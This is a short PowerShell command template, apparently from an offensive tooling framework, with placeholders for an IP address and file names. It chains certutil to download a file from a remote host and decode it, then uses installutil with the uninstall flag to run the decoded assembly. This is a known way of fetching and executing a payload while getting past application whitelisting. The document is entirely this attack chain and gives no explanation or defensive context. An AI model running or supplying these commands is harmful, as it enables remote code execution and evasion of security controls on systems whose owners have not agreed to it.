&"C:\windows\system32\certutil.exe" -urlcache -f http://{{ip}}/{{filename}} {{filename}};
&"C:\windows\system32\certutil.exe" -decode {{filename}} {{decode_name}};
&"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe" /logfile= /LogToConsole=true /U {{decode_name}};